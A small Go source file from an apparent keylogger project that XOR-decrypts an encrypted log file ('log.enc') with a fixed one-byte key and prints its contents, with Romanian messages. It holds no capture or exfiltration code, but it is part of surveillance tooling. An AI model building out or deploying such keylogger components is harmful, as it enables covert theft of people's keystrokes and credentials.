package keylogger

import (
	"bufio"
	"fmt"
	"os"
)

var key byte = 0xAA

func xorDecrypt(input string) string {
	output := make([]byte, len(input))
	for i := range input {
		output[i] = input[i] ^ key
	}
	return string(output)
}

func main() {
	file, err := os.Open("log.enc")
	if err != nil {
		fmt.Println("Eroare la deschiderea fișierului:", err)
		return
	}
	defer file.Close()

	fmt.Println("📄 Conținut decriptat:")
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		fmt.Println(xorDecrypt(line))
	}
}
